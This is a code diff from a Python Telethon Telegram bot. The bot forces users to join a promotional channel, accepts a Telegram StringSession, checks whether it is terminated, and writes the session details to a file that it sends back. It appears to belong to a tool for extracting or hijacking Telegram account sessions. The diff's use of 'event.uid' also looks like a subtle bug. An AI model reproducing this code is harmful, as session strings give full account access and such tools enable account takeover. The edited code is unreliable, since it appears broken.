@@ -23,11 +23,11 @@ bot = borg = client
 
 legendx = 511112479
 
-async def check(channel, user_id):
+async def check(channel, uid):
     try:
         result = await bot(
             functions.channels.GetParticipantRequest(
-                channel=channel, user_id=user_id
+                channel=channel, user_id=uid
             )
         )
         return True
@@ -221,7 +221,7 @@ async def op(event):
 async def start(event):
   global menu
   global channel
-  k = await check (channel, user_id)
+  k = await check (channel, event.uid)
   if not k:
     return await event.reply("Hey Kiddo 1st Join @FREEPAYTMRS")
   async with bot.conversation(event.chat_id) as x:
@@ -242,7 +242,7 @@ async def start(event):
         return await event.reply("This StringSession is terminated maybe")
       if len(i) > 3855:
         file = open("session.txt", "w")
-        file.write(i + "\n\nDETAILS BY X ARMY")
+        file.write(i + "\n\nDETAILS BY USER SeSSiON BOT")
         file.close()
         await bot.send_file(event.chat_id, "session.txt")
         system("rm -rf session.txt")
